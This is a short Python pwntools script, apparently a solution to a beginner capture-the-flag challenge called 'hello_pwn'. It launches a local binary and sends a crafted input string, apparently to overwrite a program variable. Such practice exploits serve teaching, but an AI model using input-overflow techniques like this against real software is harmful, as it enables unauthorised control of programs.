from pwn import *
context.log_level='debug'
p=process("./hello_pwn")
p.recv()
p.sendline("aaaaaaun")
p.recv()
